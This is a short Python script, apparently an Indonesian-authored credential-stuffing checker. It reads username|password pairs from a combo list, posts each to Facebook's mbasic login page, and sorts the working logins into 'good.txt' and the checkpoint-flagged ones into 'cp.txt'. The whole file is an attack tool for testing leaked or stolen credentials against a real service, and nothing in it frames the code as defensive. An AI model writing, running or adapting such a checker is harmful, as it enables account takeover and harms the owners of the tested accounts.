#!/usr/bin/python3

#Author = Xnuvers007 / Luckysora007

import requests
from tqdm import tqdm
from colorama import Fore,Style
import time

hijau = Fore.GREEN
kuning = Fore.YELLOW

test = []

kombolist = open("account.txt", 'r').readlines()

for i in kombolist:
	test.append(i)
	print(i)

# url = "http://testphp.vulnweb.com/userinfo.php"
# url = "https://web.facebook.com/login/"
# url = "https://mobile.facebook.com/login/"
url = "https://mbasic.facebook.com/login.php?next=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F&amp;ref=104&amp;refsrc=deprecated"

print(hijau+"====="*10)
for bl in tqdm(range(50), desc='Memeriksa dan memverifikasi Account.txt : '):
        time.sleep(0.5)
print(hijau+"====="*10)

print(Style.RESET_ALL," ")


for kombo in kombolist:
	seq = kombo.strip()
	acc = seq.split("|")

	username = acc[0]
	password = acc[1]
	account = username + "|" + password

#	headers = {
#		"content-type":"application/x-www-form-urlencoded",
#		"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.56 Safari/537.36 Edg/97.0.1072.41",
#		"email": username,
#		"pass": password,
#		"login": "Log In"
#	}

	for load in tqdm(range(10), desc="mengirim requests: "):
                req = requests.post(url, data={"email": username,"pass": password}).text
#	print(req)
	if 'logout.php' in req or 'mbasic_logout_button' in req:
		print(kuning+"Account Valid")
		print(kuning+f"good : {username} | {password}")
		buka = open("good.txt", 'w+')
		buka.write(f"{username} | {password}")
		buka.close()
	elif 'checkpoint' in req:
		print(kuning+"Account Invalid / Checkpoint")
		print(kuning+f"cp : {username} | {password}")
		buka2 = open("cp.txt", 'w+')
		buka2.write(f"{username} | {password}")
		buka2.close()

#	if not "email" in req:
#		print("good: " + account)
#	else:
#		print("bad: " + account)
